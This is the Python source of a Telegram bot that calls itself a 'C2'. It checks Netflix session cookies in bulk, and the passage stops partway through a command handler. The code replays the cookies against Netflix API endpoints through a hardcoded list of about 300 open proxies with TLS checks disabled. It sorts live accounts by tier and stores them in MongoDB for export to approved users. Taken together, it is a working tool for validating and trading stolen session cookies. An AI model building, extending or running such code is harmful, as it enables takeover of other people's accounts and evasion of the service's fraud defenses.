#!/usr/bin/env python3
"""
NETFLIX COOKIES CHECKER BOT - TELEGRAM C2
Full-featured Netflix cookie validator with premium account detection.
Supports: Netscape format, Standard format, Base64 encoded format.
"""

import os
import sys
import time
import json
import re
import base64
import logging
import asyncio
import aiohttp
import ssl
import uuid
import tempfile
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional, Set, Tuple, Any
from dataclasses import dataclass, field
from functools import wraps
from urllib.parse import urlparse, quote
import random
import string
import hashlib

# Telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import (
    Application, CommandHandler, ContextTypes, 
    CallbackQueryHandler, MessageHandler, filters,
    ConversationHandler
)

# Database
from pymongo import MongoClient, ASCENDING, DESCENDING
import pymongo

# Load env
from dotenv import load_dotenv
load_dotenv()

# ----------------------------- CONFIG ----------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://user:pass@cluster.mongodb.net/")
DATABASE_NAME = os.getenv("DATABASE_NAME", "netflix_bot")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "123456789").split(",")]

# API config
CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", "30"))
MAX_BULK_CHECK = int(os.getenv("MAX_BULK_CHECK", "100"))
CONCURRENT_CHECKS = int(os.getenv("CONCURRENT_CHECKS", "5"))
AUTO_DELETE_EXPIRED = os.getenv("AUTO_DELETE_EXPIRED", "True").lower() == "true"
EXPORT_DIR = os.getenv("EXPORT_DIR", "exports")
USE_PROXY = os.getenv("USE_PROXY", "True").lower() == "true"
PROXY_LIST = os.getenv("PROXY_LIST", "").split(",")

# Default proxies if environment variable not set
DEFAULT_PROXIES = [
    "http://213.21.254.26:1081",
    "http://38.211.76.203:999",
    "http://198.199.86.11:80",
    "http://103.133.27.143:8080",
    "http://209.97.150.167:80",
    "http://217.182.195.221:30007",
    "http://139.59.1.14:3128",
    "http://157.66.36.170:8080",
    "http://103.153.250.65:83",
    "http://62.60.149.161:3128",
    "http://45.70.236.194:999",
    "http://203.176.179.255:8080",
    "http://103.154.12.2:8088",
    "http://38.49.133.178:999",
    "http://113.160.132.26:8080",
    "http://200.215.229.3:999",
    "http://103.203.234.103:8080",
    "http://51.210.5.144:3129",
    "http://190.110.36.198:999",
    "http://103.152.238.89:1080",
    "http://159.203.61.169:3128",
    "http://121.101.129.97:8181",
    "http://203.76.220.126:16464",
    "http://168.228.44.66:999",
    "http://45.249.77.145:83",
    "http://185.204.170.130:83",
    "http://208.82.61.64:3128",
    "http://47.83.168.191:5000",
    "http://200.125.170.222:999",
    "http://196.251.222.109:8080",
    "http://83.143.24.66:80",
    "http://103.82.20.76:8080",
    "http://103.159.96.62:8181",
    "http://159.203.61.169:8080",
    "http://154.3.77.0:999",
    "http://82.209.251.53:45678",
    "http://189.51.170.74:999",
    "http://45.93.22.42:8080",
    "http://139.162.78.109:3128",
    "http://185.200.188.234:10001",
    "http://186.65.104.52:2024",
    "http://103.10.230.246:1337",
    "http://88.225.230.45:5314",
    "http://176.12.65.24:443",
    "http://92.118.112.32:1081",
    "http://161.35.70.249:8080",
    "http://183.87.160.62:83",
    "http://103.204.211.48:32255",
    "http://197.164.101.10:1976",
    "http://91.107.163.9:82",
    "http://197.164.101.11:1976",
    "http://103.141.150.147:8080",
    "http://186.96.15.70:8080",
    "http://80.151.57.81:8080",
    "http://38.183.183.114:999",
    "http://92.118.112.25:1082",
    "http://76.169.128.104:8080",
    "http://131.222.210.40:8080",
    "http://103.247.22.151:7777",
    "http://85.133.190.40:8097",
    "http://103.176.96.140:8082",
    "http://47.236.86.147:443",
    "http://182.253.221.147:8080",
    "http://14.170.154.193:19132",
    "http://138.68.60.8:3128",
    "http://144.91.121.61:3129",
    "http://92.63.226.78:2080",
    "http://103.165.157.235:3125",
    "http://62.133.62.249:1082",
    "http://187.172.57.158:999",
    "http://103.188.252.65:1234",
    "http://45.171.111.255:999",
    "http://176.111.37.5:39811",
    "http://45.157.140.12:1080",
    "http://209.97.150.167:8080",
    "http://139.59.1.14:80",
    "http://45.95.232.35:3128",
    "http://178.250.156.112:443",
    "http://103.109.96.57:2610",
    "http://62.133.62.17:1082",
    "http://85.105.163.43:1953",
    "http://185.28.155.163:1433",
    "http://202.28.194.139:31280",
    "http://198.199.86.11:3128",
    "http://103.86.117.58:8080",
    "http://71.198.208.169:443",
    "http://45.177.20.187:999",
    "http://71.14.23.121:8080",
    "http://103.48.68.37:83",
    "http://119.148.47.233:1048",
    "http://38.137.179.253:999",
    "http://81.168.119.85:443",
    "http://187.62.241.136:8080",
    "http://38.194.246.34:999",
    "http://190.2.213.169:999",
    "http://103.194.175.51:7777",
    "http://202.73.27.106:8080",
    "http://34.43.46.91:80",
    "http://222.228.194.131:8080",
    "http://187.223.209.37:80",
    "http://157.20.233.184:8080",
    "http://103.167.61.162:3128",
    "http://141.136.13.51:8080",
    "http://180.180.175.11:8080",
    "http://103.133.27.229:8080",
    "http://103.129.127.244:8088",
    "http://82.146.38.71:443",
    "http://140.227.61.201:3128",
    "http://139.167.218.162:3127",
    "http://64.49.15.225:143",
    "http://125.27.241.98:8080",
    "http://116.204.231.88:8090",
    "http://193.222.59.163:443",
    "http://103.137.35.2:80",
    "http://64.204.90.177:999",
    "http://202.154.19.7:8080",
    "http://2.78.60.10:3129",
    "http://103.126.87.112:1285",
    "http://170.245.132.82:9000",
    "http://192.203.0.118:999",
    "http://161.35.70.249:80",
    "http://159.203.61.169:80",
    "http://41.169.150.194:8080",
    "http://23.81.87.202:8118",
    "http://163.227.248.71:8181",
    "http://121.101.135.46:8089",
    "http://120.28.193.225:8080",
    "http://196.251.223.54:8080",
    "http://84.242.58.9:8080",
    "http://209.97.150.167:3128",
    "http://103.56.206.67:4000",
    "http://201.182.149.99:999",
    "http://38.46.233.146:8080",
    "http://198.199.86.11:8080",
    "http://176.88.166.222:8080",
    "http://202.83.174.147:80",
    "http://177.234.217.82:999",
    "http://190.94.212.247:999",
    "http://152.32.132.190:7890",
    "http://138.117.231.133:999",
    "http://74.62.179.122:8080",
    "http://202.148.13.182:8080",
    "http://98.154.21.253:4228",
    "http://104.154.186.48:80",
    "http://160.19.18.209:8080",
    "http://103.247.22.15:1111",
    "http://209.38.35.154:443",
    "http://78.189.92.15:1953",
    "http://103.156.57.135:9988",
    "http://175.106.15.186:8080",
    "http://180.191.20.206:8080",
    "http://49.51.228.35:81",
    "http://185.157.160.159:8118",
    "http://103.133.26.72:8080",
    "http://103.234.31.79:8080",
    "http://103.175.236.180:8382",
    "http://62.133.62.207:1082",
    "http://86.62.2.25:3128",
    "http://37.59.110.73:80",
    "http://223.205.184.87:8080",
    "http://34.96.238.40:8080",
    "http://103.156.75.246:8181",
    "http://27.50.29.226:8080",
    "http://203.128.75.194:8080",
    "http://182.53.202.208:8080",
    "http://5.202.52.103:6220",
    "http://202.183.236.220:8080",
    "http://92.118.112.32:1082",
    "http://161.35.70.249:3128",
    "http://103.105.55.203:8085",
    "http://186.33.3.209:999",
    "http://103.173.139.220:8080",
    "http://115.42.67.186:8080",
    "http://118.69.186.75:1452",
    "http://157.15.144.80:8080",
    "http://194.48.198.135:7070",
    "http://195.158.8.123:3128",
    "http://179.48.11.6:8085",
    "http://95.173.179.212:1953",
    "http://207.244.244.178:3128",
    "http://91.107.182.124:82",
    "http://201.230.15.57:999",
    "http://180.92.233.170:10000",
    "http://103.208.102.2:8080",
    "http://38.191.42.201:999",
    "http://103.155.167.149:8181",
    "http://45.115.253.30:83",
    "http://103.48.68.34:83",
    "http://62.133.62.184:1081",
    "http://161.49.210.196:10101",
    "http://132.243.234.171:9443",
    "http://41.215.86.226:18080",
    "http://181.78.95.98:999",
    "http://114.94.148.37:18080",
    "http://103.165.157.107:8080",
    "http://103.101.216.70:8080",
    "http://95.173.179.213:1953",
    "http://178.128.95.176:8080",
    "http://103.171.183.146:7777",
    "http://139.59.1.14:8080",
    "http://217.154.155.115:8080",
    "http://77.110.113.236:8080",
    "http://131.196.245.120:999",
    "http://103.173.140.131:1111",
    "http://134.209.29.120:8080",
    "http://14.241.133.207:8080",
    "http://103.165.128.171:8080",
    "http://45.119.113.65:83",
    "http://46.105.35.193:8080",
    "http://103.82.246.23:6080",
    "http://45.32.8.165:6688",
    "http://190.181.29.114:999",
    "http://134.209.29.120:80",
    "http://103.171.255.59:8080",
    "http://203.162.13.222:6868",
    "http://31.223.7.155:1953",
    "http://103.51.205.168:8080",
    "http://103.125.38.50:8080",
    "http://181.129.183.19:53281",
    "http://181.13.221.155:999",
    "http://212.1.86.225:81",
    "http://212.34.146.118:3128",
    "http://91.188.213.143:1080",
    "http://212.58.132.5:8888",
    "http://187.251.224.167:80",
    "http://144.24.41.48:9999",
    "http://159.195.49.27:8888",
    "http://38.159.63.8:999",
    "http://103.245.96.165:3214",
    "http://92.118.112.25:1081",
    "http://45.168.238.193:8443",
    "http://65.109.87.121:28080",
    "http://103.39.70.68:1452",
    "http://128.199.202.122:80",
    "http://103.175.238.106:8082",
    "http://163.227.149.135:8080",
    "http://110.136.15.28:8080",
    "http://103.156.75.41:8080",
    "http://220.95.121.83:1521",
    "http://78.187.90.223:5314",
    "http://200.115.100.33:8080",
    "http://45.95.233.237:1081",
    "http://103.170.185.162:46",
    "http://103.99.136.66:8080",
    "http://103.205.178.226:8080",
    "http://62.133.62.231:1082",
    "http://176.111.37.216:39811",
    "http://177.19.167.242:80",
    "http://138.197.68.35:4857",
    "http://160.19.110.130:8082",
    "http://157.180.84.115:443",
    "http://94.158.49.82:3128",
    "http://14.248.84.131:8080",
    "http://187.103.105.20:8085",
    "http://138.124.106.230:443",
    "http://121.180.75.228:1723",
    "http://102.164.252.150:8080",
    "http://157.10.97.185:8080",
    "http://170.233.192.225:999",
    "http://139.59.59.122:8118",
    "http://178.128.243.121:3128",
    "http://128.199.202.122:3128",
    "http://95.3.69.222:8080",
    "http://159.223.87.50:443",
    "http://62.133.62.249:1081",
    "http://72.56.238.99:9090",
    "http://103.138.185.81:83",
    "http://157.100.53.120:999",
    "http://164.215.127.146:8080",
    "http://103.155.168.161:8299",
    "http://103.185.250.142:1452",
    "http://174.137.134.182:2999",
    "http://45.167.126.42:999",
    "http://185.204.170.130:84",
    "http://38.158.83.193:999",
    "http://185.121.13.73:3128",
    "http://134.209.29.120:3128",
    "http://103.181.183.136:80",
    "http://138.68.60.8:80",
    "http://51.178.253.98:80",
    "http://103.18.77.14:1111",
    "http://103.82.246.15:6080",
    "http://103.148.216.121:8080",
    "http://103.121.199.138:62797",
    "http://34.43.46.91:443",
    "http://54.39.28.106:8082",
    "http://103.124.137.150:20",
    "http://138.68.60.8:8080",
    "http://91.107.182.124:84",
    "http://62.133.62.187:1081",
    "http://182.253.69.95:8080",
    "http://45.95.233.237:1082",
    "http://122.3.41.154:8090",
    "http://62.133.62.3:1081",
    "http://154.201.16.86:8081",
    "http://183.178.50.58:8080",
    "http://85.105.98.6:5314",
    "http://197.164.101.11:1981",
    "http://52.74.26.202:8080",
    "http://12.232.227.99:8080",
    "http://203.174.15.83:8080",
    "http://45.168.244.16:8080",
    "http://104.161.23.122:5058",
    "http://65.109.65.239:18080",
    "http://185.230.190.195:3128",
    "http://217.123.140.50:8888",
    "http://58.69.114.117:5050",
    "http://36.88.111.250:8787",
    "http://102.68.128.211:8080",
    "http://103.199.215.43:6262",
    "http://190.12.150.244:999",
    "http://103.43.191.71:8888",
    "http://103.93.193.141:58080",
    "http://157.100.53.121:999",
    "http://95.9.81.181:1953",
    "http://217.182.195.221:30004",
    "http://8.219.97.248:80",
    "http://177.131.113.108:3128",
    "http://195.57.239.25:8080",
    "http://117.236.124.166:3128",
    "http://186.65.106.90:2024",
    "http://186.235.123.3:8080",
    "http://103.102.153.215:33128",
    "http://47.81.56.193:8888",
    "http://163.223.78.87:3127",
    "http://65.109.65.238:18080",
    "http://103.124.251.12:8081"
]

# Merge proxies from env and defaults
_all_proxies = list(set(DEFAULT_PROXIES + [p for p in PROXY_LIST if p.strip()]))

# ----------------------------- LOGGING ---------------------------------
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler("netflix_bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("netflix_bot")

# ----------------------------- UTILITY FUNCTIONS ------------------------
def make_aware(dt):
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

def escape_markdown(text: str) -> str:
    if not text:
        return ""
    special_chars = r'_*[]()~`>#+-=|{}.!'
    return ''.join(f'\\{char}' if char in special_chars else char for char in str(text))

def random_string(length: int = 16) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def get_random_proxy() -> Optional[str]:
    """Get a random proxy from the list"""
    if not USE_PROXY or not _all_proxies:
        return None
    return random.choice(_all_proxies)

def parse_netscape_cookie(cookie_text: str) -> Dict[str, str]:
    """
    Parse Netscape format cookie file content
    Format: domain flag secure expires name value
    """
    cookie_dict = {}
    lines = cookie_text.strip().split('\n')
    
    for line in lines:
        line = line.strip()
        # Skip comments and empty lines
        if not line or line.startswith('#'):
            continue
        
        parts = line.split()
        if len(parts) >= 7:
            # Netscape format: domain flag secure expires name value
            # domain, flag, secure, expires, name, value
            name = parts[5]
            value = parts[6]
            cookie_dict[name] = value
    
    return cookie_dict

def validate_cookie(cookie: str) -> bool:
    """Validate Netflix cookie format - Supports Netscape, Standard, Base64"""
    if not cookie:
        return False
    
    cookie = cookie.strip()
    
    # Check if it's Netscape format (contains tab/spaces and .netflix.com)
    if '.netflix.com' in cookie and 'TRUE' in cookie:
        return True
    
    # Check if it's standard cookie format
    if '=' in cookie and ';' in cookie:
        # Check for Netflix specific patterns
        netflix_patterns = ['NetflixId', 'nfvdid', 'SecureNetflixId', 'netflix_session']
        cookie_lower = cookie.lower()
        for pattern in netflix_patterns:
            if pattern.lower() in cookie_lower:
                return True
    
    # Check if it's base64 encoded
    try:
        decoded = base64.b64decode(cookie, validate=True)
        if decoded:
            try:
                decoded_str = decoded.decode('utf-8')
                if '=' in decoded_str:
                    return True
            except:
                pass
    except:
        pass
    
    return False

def parse_cookie(cookie: str) -> Dict[str, str]:
    """Parse cookie string into dict - Supports multiple formats"""
    cookie = cookie.strip()
    cookie_dict = {}
    
    # Try Netscape format first
    if '.netflix.com' in cookie and 'TRUE' in cookie:
        try:
            cookie_dict = parse_netscape_cookie(cookie)
            if cookie_dict:
                return cookie_dict
        except Exception as e:
            logger.debug(f"Netscape parse failed: {e}")
    
    # Try base64 decode
    try:
        decoded = base64.b64decode(cookie, validate=True)
        try:
            cookie = decoded.decode('utf-8')
        except:
            pass
    except:
        pass
    
    # Parse standard cookie string
    if ';' in cookie:
        parts = cookie.split(';')
    else:
        parts = cookie.split()
    
    for part in parts:
        part = part.strip()
        if '=' in part:
            key, value = part.split('=', 1)
            cookie_dict[key.strip()] = value.strip()
    
    return cookie_dict

# ----------------------------- DATABASE --------------------------------
class Database:
    def __init__(self, uri=MONGODB_URI, db_name=DATABASE_NAME):
        if not uri:
            logger.error("MONGODB_URI not set!")
            self.client = None
            self.db = None
            return
            
        self.client = MongoClient(uri, serverSelectionTimeoutMS=5000)
        self.db = self.client[db_name]
        
        self.users = self.db.users
        self.cookies = self.db.cookies
        self.checks = self.db.checks
        self.settings = self.db.settings
        
        self._init_indexes()
        self._init_defaults()
    
    def _init_indexes(self):
        try:
            self.users.create_index([("user_id", ASCENDING)], unique=True)
            self.users.create_index([("approved", ASCENDING)])
            
            self.cookies.create_index([("cookie_hash", ASCENDING)], unique=True)
            self.cookies.create_index([("status", ASCENDING)])
            self.cookies.create_index([("account_tier", ASCENDING)])
            self.cookies.create_index([("expires_at", ASCENDING)])
            self.cookies.create_index([("user_id", ASCENDING)])
            
            self.checks.create_index([("timestamp", DESCENDING)])
            self.checks.create_index([("user_id", ASCENDING)])
            
            logger.info("Database indexes initialized")
        except Exception as e:
            logger.error(f"Index initialization error: {e}")
    
    def _init_defaults(self):
        for admin_id in ADMIN_IDS:
            self.users.update_one(
                {"user_id": admin_id},
                {"$set": {
                    "username": "admin",
                    "approved": True,
                    "is_admin": True,
                    "created_at": get_current_time()
                }},
                upsert=True
            )
        
        self.settings.update_one(
            {"_id": "global"},
            {"$setOnInsert": {
                "auto_delete_expired": AUTO_DELETE_EXPIRED,
                "max_bulk_check": MAX_BULK_CHECK,
                "concurrent_checks": CONCURRENT_CHECKS,
                "updated_at": get_current_time()
            }},
            upsert=True
        )
    
    # ---------- USER METHODS ----------
    def get_user(self, user_id: int) -> Optional[Dict]:
        user = self.users.find_one({"user_id": user_id})
        if user:
            if user.get("created_at"):
                user["created_at"] = make_aware(user["created_at"])
            if user.get("approved_at"):
                user["approved_at"] = make_aware(user["approved_at"])
        return user
    
    def create_user(self, user_id: int, username: str = None) -> Dict:
        existing = self.get_user(user_id)
        if existing:
            return existing
            
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "is_admin": user_id in ADMIN_IDS,
            "approved_at": None,
            "total_checks": 0,
            "valid_cookies": 0,
            "created_at": get_current_time(),
            "last_active": get_current_time()
        }
        try:
            self.users.insert_one(user_data)
            logger.info(f"Created user: {user_id}")
        except pymongo.errors.DuplicateKeyError:
            return self.get_user(user_id)
        return user_data
    
    def approve_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": True, "approved_at": get_current_time()}}
        )
        return result.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        result = self.users.update_one(
            {"user_id": user_id},
            {"$set": {"approved": False, "approved_at": None}}
        )
        return result.modified_count > 0
    
    def is_user_approved(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        if not user:
            return False
        return user.get("approved", False)
    
    def update_user_activity(self, user_id: int):
        self.users.update_one(
            {"user_id": user_id},
            {"$set": {"last_active": get_current_time()}}
        )
    
    def increment_user_stats(self, user_id: int, check_count: int = 1, valid_count: int = 0):
        self.users.update_one(
            {"user_id": user_id},
            {"$inc": {"total_checks": check_count, "valid_cookies": valid_count}}
        )
    
    # ---------- COOKIE METHODS ----------
    def add_cookie(self, cookie: str, user_id: int = None) -> str:
        """Add cookie to database"""
        cookie_hash = hashlib.sha256(cookie.encode()).hexdigest()
        
        existing = self.cookies.find_one({"cookie_hash": cookie_hash})
        if existing:
            return existing.get("_id")
        
        cookie_data = {
            "_id": str(uuid.uuid4()),
            "cookie": cookie,
            "cookie_hash": cookie_hash,
            "user_id": user_id,
            "status": "pending",
            "account_tier": None,
            "profile_name": None,
            "profile_language": None,
            "maturity_level": None,
            "expires_at": None,
            "checked_at": None,
            "created_at": get_current_time(),
            "views": 0
        }
        
        try:
            self.cookies.insert_one(cookie_data)
            logger.info(f"Added cookie: {cookie_hash[:8]}")
            return cookie_data["_id"]
        except pymongo.errors.DuplicateKeyError:
            return self.cookies.find_one({"cookie_hash": cookie_hash})["_id"]
    
    def add_cookies_bulk(self, cookies: List[str], user_id: int = None) -> List[Dict]:
        results = []
        for cookie in cookies:
            cookie = cookie.strip()
            if cookie and validate_cookie(cookie):
                try:
                    cookie_id = self.add_cookie(cookie, user_id)
                    results.append({"cookie": cookie, "id": cookie_id, "status": "added"})
                except Exception as e:
                    results.append({"cookie": cookie, "status": "error", "error": str(e)})
            else:
                results.append({"cookie": cookie, "status": "invalid_format"})
        return results
    
    def get_cookie(self, cookie_id: str) -> Optional[Dict]:
        return self.cookies.find_one({"_id": cookie_id})
    
    def get_cookie_by_hash(self, cookie_hash: str) -> Optional[Dict]:
        return self.cookies.find_one({"cookie_hash": cookie_hash})
    
    def update_cookie_status(self, cookie_id: str, status: str, details: Dict = None):
        updates = {
            "status": status,
            "checked_at": get_current_time()
        }
        if details:
            updates.update(details)
        self.cookies.update_one({"_id": cookie_id}, {"$set": updates})
    
    def get_pending_cookies(self, limit: int = 100) -> List[Dict]:
        return list(self.cookies.find({"status": "pending"}).limit(limit))
    
    def get_valid_cookies(self, limit: int = 100) -> List[Dict]:
        return list(self.cookies.find({"status": "valid"}).sort("checked_at", -1).limit(limit))
    
    def get_cookie_stats(self) -> Dict:
        total = self.cookies.count_documents({})
        valid = self.cookies.count_documents({"status": "valid"})
        invalid = self.cookies.count_documents({"status": "invalid"})
        expired = self.cookies.count_documents({"status": "expired"})
        pending = self.cookies.count_documents({"status": "pending"})
        
        tier_stats = {}
        for tier in ["Basic", "Standard", "Premium"]:
            tier_stats[tier] = self.cookies.count_documents({
                "status": "valid",
                "account_tier": tier
            })
        
        return {
            "total": total,
            "valid": valid,
            "invalid": invalid,
            "expired": expired,
            "pending": pending,
            "tiers": tier_stats
        }
    
    def delete_cookie(self, cookie_id: str) -> bool:
        result = self.cookies.delete_one({"_id": cookie_id})
        return result.deleted_count > 0
    
    def delete_invalid_cookies(self) -> int:
        result = self.cookies.delete_many({"status": {"$in": ["invalid", "expired"]}})
        return result.deleted_count
    
    def cleanup_expired(self) -> int:
        result = self.cookies.delete_many({"status": "expired"})
        return result.deleted_count
    
    # ---------- CHECK METHODS ----------
    def log_check(self, user_id: int, cookie_id: str, status: str, details: Dict = None):
        check_data = {
            "user_id": user_id,
            "cookie_id": cookie_id,
            "status": status,
            "details": details,
            "timestamp": get_current_time()
        }
        self.checks.insert_one(check_data)
    
    def get_user_checks(self, user_id: int, limit: int = 20) -> List[Dict]:
        return list(self.checks.find({"user_id": user_id}).sort("timestamp", -1).limit(limit))

db = Database()
# ----------------------------- NETFLIX CHECKER ENGINE -----------------
class NetflixChecker:
    @staticmethod
    async def check_single_cookie(cookie: str) -> Dict:
        """Check a single Netflix cookie with proxy support"""
        result = {
            "valid": False,
            "account_tier": None,
            "profile_name": None,
            "profile_language": None,
            "maturity_level": None,
            "expires_at": None,
            "error": None
        }
        
        # Parse cookie
        cookie_dict = parse_cookie(cookie)
        if not cookie_dict:
            result["error"] = "Invalid cookie format"
            return result
        
        # Build cookie string
        cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
        
        # Headers with proper Host
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Cookie": cookie_str,
            "Host": "www.netflix.com",
            "Origin": "https://www.netflix.com",
            "Referer": "https://www.netflix.com/",
            "Connection": "keep-alive",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Upgrade-Insecure-Requests": "1",
            "DNT": "1",
            "TE": "trailers"
        }
        
        # Proxy
        proxy = get_random_proxy() if USE_PROXY else None
        if proxy:
            logger.info(f"Using proxy: {proxy}")
        
        try:
            async with aiohttp.ClientSession() as session:
                profile_url = "https://www.netflix.com/api/shakti/viper/metadata"
                params = {
                    "movieid": "80057281",
                    "image_sizes": "185x278,464x696,50x70,278x185,696x278,70x50,96x96",
                    "image_format": "webp",
                    "with_size": "true",
                    "materialize": "true",
                    "uncached": "false"
                }
                
                try:
                    timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
                    
                    async with session.get(
                        profile_url, 
                        headers=headers, 
                        params=params,
                        timeout=timeout,
                        proxy=proxy,
                        ssl=False
                    ) as resp:
                        logger.info(f"Status: {resp.status}")
                        
                        if resp.status == 200:
                            data = await resp.json()
                            if data and "video" in data:
                                result["valid"] = True
                                result["account_tier"] = NetflixChecker._detect_tier(data)
                                result["profile_name"] = NetflixChecker._get_profile_name(data)
                                result["profile_language"] = NetflixChecker._get_language(data)
                                result["maturity_level"] = NetflixChecker._get_maturity(data)
                                
                                # Get account details
                                try:
                                    account_url = "https://www.netflix.com/api/shakti/viper/user"
                                    async with session.get(
                                        account_url,
                                        headers=headers,
                                        timeout=timeout,
                                        proxy=proxy,
                                        ssl=False
                                    ) as acc_resp:
                                        if acc_resp.status == 200:
                                            acc_data = await acc_resp.json()
                                            if acc_data and "account" in acc_data:
                                                account = acc_data.get("account", {})
                                                if "expires" in account:
                                                    result["expires_at"] = account.get("expires")
                                except Exception as e:
                                    logger.debug(f"Account details error: {e}")
                                
                            else:
                                result["error"] = "No video data found"
                                
                        elif resp.status == 401 or resp.status == 403:
                            result["error"] = "Invalid cookie (unauthorized)"
                        elif resp.status == 404:
                            result["error"] = "Account not found"
                        elif resp.status == 421:
                            # Try different Host
                            headers["Host"] = "api.netflix.com"
                            headers["Origin"] = "https://api.netflix.com"
                            async with session.get(
                                profile_url,
                                headers=headers,
                                params=params,
                                timeout=timeout,
                                proxy=proxy,
                                ssl=False
                            ) as retry_resp:
                                if retry_resp.status == 200:
                                    data = await retry_resp.json()
                                    if data and "video" in data:
                                        result["valid"] = True
                                        result["account_tier"] = "Unknown"
                                        result["profile_name"] = "Unknown"
                                    else:
                                        result["error"] = "Cookie invalid (421)"
                                else:
                                    result["error"] = f"HTTP 421 - Cookie invalid or expired"
                        else:
                            result["error"] = f"HTTP {resp.status}"
                            
                except asyncio.TimeoutError:
                    result["error"] = "Timeout"
                except aiohttp.ClientProxyConnectionError:
                    result["error"] = "Proxy connection failed"
                except Exception as e:
                    result["error"] = str(e)
        
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    @staticmethod
    def _detect_tier(data: Dict) -> str:
        if "video" in data:
            video = data.get("video", {})
            if "tier" in video:
                tier = video.get("tier", "")
                if "premium" in tier.lower():
                    return "Premium"
                elif "standard" in tier.lower():
                    return "Standard"
                elif "basic" in tier.lower():
                    return "Basic"
        
        if "availableMaturityLevels" in data:
            levels = data.get("availableMaturityLevels", [])
            if len(levels) >= 4:
                return "Premium"
            elif len(levels) >= 3:
                return "Standard"
            elif len(levels) >= 2:
                return "Basic"
        
        return "Unknown"
    
    @staticmethod
    def _get_profile_name(data: Dict) -> str:
        if "profiles" in data:
            profiles = data.get("profiles", [])
            if profiles and "name" in profiles[0]:
                return profiles[0].get("name")
        return "Unknown"
    
    @staticmethod
    def _get_language(data: Dict) -> str:
        if "preferredLanguage" in data:
            return data.get("preferredLanguage")
        return "Unknown"
    
    @staticmethod
    def _get_maturity(data: Dict) -> str:
        if "maturityLevel" in data:
            return data.get("maturityLevel")
        return "Unknown"
    
    @staticmethod
    async def check_bulk_cookies(cookies: List[str], progress_callback=None) -> List[Dict]:
        results = []
        semaphore = asyncio.Semaphore(CONCURRENT_CHECKS)
        
        async def check_one(cookie: str, index: int):
            async with semaphore:
                result = await NetflixChecker.check_single_cookie(cookie)
                result["cookie"] = cookie
                result["index"] = index
                if progress_callback:
                    await progress_callback(index, len(cookies))
                return result
        
        tasks = [check_one(cookie, i) for i, cookie in enumerate(cookies)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        processed = []
        for result in results:
            if isinstance(result, Exception):
                processed.append({
                    "cookie": "",
                    "valid": False,
                    "error": str(result)
                })
            else:
                processed.append(result)
        
        return processed

# ----------------------------- TELEGRAM HANDLERS -----------------------
def admin_required(func):
    @wraps(func)
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text("❌ You are not authorized to use this command.")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    
    db.create_user(user_id, username)
    
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            "❌ You are not approved to use this bot.\n"
            "Please contact admin for approval."
        )
        return
    
    await update.message.reply_text(
        "🎬 *Netflix Cookies Checker Bot*\n\n"
        "Commands:\n"
        "/check `<cookie>` - Check single cookie\n"
        "/bulk - Upload .txt file with cookies (one per line)\n"
        "/stats - Your checking statistics\n"
        "/valid - Get valid cookies\n"
        "/help - Show this message\n\n"
        "*Supported Formats:*\n"
        "• Standard: `name=value; name2=value2`\n"
        "• Netscape: `.netflix.com TRUE / ...`\n"
        "• Base64: `bmV0ZmxpeF9zZXNzaW9u...`\n\n"
        "Admin Commands:\n"
        "/approve <user_id> - Approve user\n"
        "/disapprove <user_id> - Disapprove user\n"
        "/users - List all users\n"
        "/cookies - Cookie statistics\n"
        "/export - Export valid cookies\n"
        "/cleanup - Delete invalid cookies\n"
        "/proxy - Show proxy status",
        parse_mode="Markdown"
    )

async def proxy_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show proxy status"""
    user_id = update.effective_user.id
    
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ Not approved.")
        return
    
    status = "🟢 Enabled" if USE_PROXY else "🔴 Disabled"
    proxy_count = len(_all_proxies)
    
    await update.message.reply_text(
        f"🌐 *Proxy Status*\n\n"
        f"Status: {status}\n"
        f"Proxies: {proxy_count}\n\n"
        f"First 5 proxies:\n" + "\n".join([f"• {p}" for p in _all_proxies[:5]]) if _all_proxies else "No proxies configured",
        parse_mode="Markdown"
    )

# ----------------------------- CHECK COMMANDS --------------------------
async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Check single Netflix cookie"""
    user_id = update.effective_user.id
    
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text("❌ You are not approved to use this bot.")
        return
    
    args = context.args
    if not args:
        await update.message.reply_text(
